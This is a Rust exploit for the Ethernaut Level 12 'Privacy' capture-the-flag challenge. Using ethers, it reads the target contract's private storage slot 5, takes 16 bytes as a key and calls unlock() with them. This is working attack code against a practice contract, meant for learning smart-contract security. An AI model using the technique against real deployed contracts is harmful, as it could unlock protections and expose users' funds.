use async_trait::async_trait;
use ctf::ethernaut::lvl12_privacy::*;
use ethers::prelude::*;

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    /**
     * @title Ethernaut Level 12: Privacy
     *
     * The creator of this contract was careful enough
     * to protect the sensitive areas of its storage.
     *
     * Unlock this contract to beat the level.
     *
     * Things that might help:
     * Understanding how storage works
     * Understanding how parameter parsing works
     * Understanding how casting works
     *
     * Tips:
     * Remember that metamask is just a commodity. Use
     * another tool if it is presenting problems.
     *  Advanced gameplay could involve using remix, or
     * your own web3 provider.
     */
    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let five = H256::from_low_u64_be(5);
        println!("{five:?}");
        let slot = offender.get_storage_at(target.address, five, None).await?;
        let mut key = [0; 16];
        key.copy_from_slice(&slot.0[0..16]);

        Privacy::new(target.address, offender.to_owned())
            .unlock(key)
            .send()
            .await?
            .await?;

        Ok(())
    }
}
